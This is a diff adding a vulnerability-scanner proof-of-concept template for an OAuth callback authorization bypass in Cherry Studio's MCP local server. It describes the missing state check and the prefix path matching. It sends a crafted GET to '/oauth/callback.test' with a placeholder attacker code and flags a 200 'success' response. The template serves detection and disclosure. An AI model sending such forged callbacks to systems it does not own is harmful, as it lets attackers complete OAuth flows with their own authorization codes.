@@ -1,0 +1,29 @@
+[info]
+id = "POC-AVE-2026-0021"
+name = "Cherry Studio MCP OAuth 回调授权绕过 PoC"
+author = "AVE"
+severity = "medium"
+tags = ["oauth", "authorization-bypass", "cwe-266", "cwe-285"]
+description = "Cherry Studio MCP OAuth 本地回调服务器未验证 state 参数且路径使用前缀匹配，攻击者可抢先发送恶意授权码完成认证"
+vuln_id = ["CVE-2026-13524", "AVE-2026-0021"]
+
+[poc]
+logic = "any"
+
+# 测试路径前缀匹配：/oauth/callback.test 应被拒绝（仅应接受 /oauth/callback）
+# 同时测试缺少 state 校验：传递任意 state 值应被拒绝
+# 若服务器返回 200，说明路径前缀匹配绕过和/或 state 校验缺失漏洞存在
+[[poc.requests]]
+method = "GET"
+path = "/oauth/callback.test?code=ATTACKER_CODE&state=INVALID_STATE"
+
+[[poc.requests.matchers]]
+type = "status"
+status = [200]
+expect = true
+
+[[poc.requests.matchers]]
+type = "word"
+part = "body"
+words = ["success", "Success", "authorization", "Authorization"]
+expect = true
